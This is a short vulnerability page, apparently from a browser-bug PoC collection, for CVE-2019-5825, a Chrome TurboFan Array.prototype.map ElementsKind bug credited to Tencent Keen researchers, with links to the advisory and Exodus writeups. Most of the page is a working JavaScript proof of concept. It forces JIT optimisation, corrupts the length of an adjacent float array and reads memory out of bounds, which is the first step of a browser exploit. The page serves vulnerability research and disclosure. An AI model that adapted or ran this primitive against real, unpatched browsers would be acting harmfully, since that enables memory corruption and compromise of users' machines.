# CVE-2019-5825
* Date : April 2019
* Credit : Gengming Liu, Jianyu Chen, Zhen Feng, Jessica Liu at Tencent Keen

## Description
[TurboFan] Array.prototype.map wrong ElementsKind for output array

## PoC
```js
// This call ensures that TurboFan won't inline array constructors.
Array(2**30);

// we are aiming for the following object layout
// [output of Array.map][packed float array]
// First the length of the packed float array is corrupted via the original vulnerability,

// offset of the length field of the float array from the map output
const float_array_len_offset = 23;

// Set up a fast holey smi array, and generate optimized code.
let a = [1, 2, ,,, 3];
var float_array;

function mapping(a) {
  function cb(elem, idx) {
    if (idx == 0) {
      float_array = [0.1, 0.2];
    }
    if (idx > float_array_len_offset) {
      // minimize the corruption for stability
      throw "stop";      
    }
    return idx;
  }
  
  return a.map(cb);
}
mapping(a);
mapping(a);
%OptimizeFunctionOnNextCall(mapping);
mapping(a);

// Now lengthen the array, but ensure that it points to a non-dictionary
// backing store.
a.length = (32 * 1024 * 1024)-1;
a.fill(1, float_array_len_offset, float_array_len_offset+1);
a.fill(1, float_array_len_offset+2);

a.push(2);
a.length += 500;

// Now, the non-inlined array constructor should produce an array with
// dictionary elements: causing a crash.
cnt = 1;
try {
  mapping(a);
} catch(e) {
  console.log(float_array.length);
  console.log(float_array[3]);
}
```

## Reference
[Stable Channel Update](https://chromereleases.googleblog.com/2019/04/stable-channel-update-for-desktop_30.html)  
[issue 941743](https://bugs.chromium.org/p/chromium/issues/detail?id=941743)  
[Exodus 1day Writeup](https://blog.exodusintel.com/2019/04/03/a-window-of-opportunity/)  
[Exodus 1day Github](https://github.com/exodusintel/Chromium-941743)  